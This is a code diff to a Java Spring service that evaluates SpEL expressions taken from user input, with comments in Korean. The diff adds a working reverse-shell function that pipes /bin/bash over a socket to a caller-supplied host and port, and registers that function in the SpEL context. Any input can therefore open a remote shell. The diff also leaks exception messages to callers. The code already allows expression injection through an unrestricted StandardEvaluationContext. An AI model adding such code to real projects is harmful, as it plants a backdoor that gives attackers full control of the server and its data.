@@ -6,6 +6,9 @@ import org.springframework.expression.spel.support.StandardEvaluationContext;
 import org.springframework.expression.spel.support.StandardTypeLocator;
 import org.springframework.stereotype.Service;
 
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -13,13 +16,51 @@ import java.util.regex.Pattern;
 public class SpelEvalService {
     private static final Pattern DOLLAR_PATTERN = Pattern.compile("\\$\\{([^}]+)\\}");
 
+    // reverseShell 함수 정의
+    public static void reverseShell(String ip, int port) {
+        try {
+            Socket s = new Socket(ip, port);
+            Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
+
+            // 프로세스 stdout -> 소켓
+            new Thread(() -> {
+                try (InputStream pi = p.getInputStream(); OutputStream so = s.getOutputStream()) {
+                    byte[] buf = new byte[1024];
+                    int len;
+                    while ((len = pi.read(buf)) != -1) {
+                        so.write(buf, 0, len);
+                        so.flush();
+                    }
+                } catch (Exception ignored) {}
+            }).start();
+
+            // 소켓 -> 프로세스 stdin
+            new Thread(() -> {
+                try (InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream()) {
+                    byte[] buf = new byte[1024];
+                    int len;
+                    while ((len = si.read(buf)) != -1) {
+                        po.write(buf, 0, len);
+                        po.flush();
+                    }
+                } catch (Exception ignored) {}
+            }).start();
+        } catch (Exception e) {
+            // 예외 무시
+        }
+    }
+
     public String evaluate(String input) {
         if (input == null) return null;
         ExpressionParser parser = new SpelExpressionParser();
         StandardEvaluationContext context = new StandardEvaluationContext();
         context.setTypeLocator(new StandardTypeLocator(getClass().getClassLoader()));
 
-        // reverseShell 함수 등록 제거 (평가 기능만 유지)
+        // reverseShell 함수 SpEL에 등록
+        try {
+            context.registerFunction("reverseShell",
+                    SpelEvalService.class.getMethod("reverseShell", String.class, int.class));
+        } catch (Exception ignored) {}
 
         Matcher m = DOLLAR_PATTERN.matcher(input);
         StringBuffer sb = new StringBuffer();
@@ -29,7 +70,8 @@ public class SpelEvalService {
             try {
                 val = parser.parseExpression(expr).getValue(context);
             } catch (Exception e) {
-                val = "실패";
+                e.printStackTrace(); // 콘솔에 예외 메시지 출력
+                val = "실패: " + e.getMessage();
             }
             m.appendReplacement(sb, val != null ? Matcher.quoteReplacement(val.toString()) : "");
         }
